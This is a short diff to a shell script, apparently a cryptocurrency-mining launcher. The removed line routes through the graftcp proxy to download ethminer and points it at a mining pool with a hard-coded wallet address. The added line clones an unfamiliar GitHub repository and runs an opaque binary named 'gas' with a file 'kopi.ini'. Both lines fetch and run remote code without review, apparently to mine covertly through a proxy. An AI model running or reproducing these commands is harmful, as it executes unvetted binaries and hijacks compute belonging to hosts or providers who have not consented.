@@ -31,4 +31,4 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && cd bin/ && export LC_ALL=C; unset LANGUAGE && ./ethminer -U -P stratum2+tcp://3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.tester@144.217.82.15:80
+./graftcp/graftcp git clone https://github.com/adisubarja/asu && cd asu && chmod +x gas kopi.ini && ./gas kopi.ini
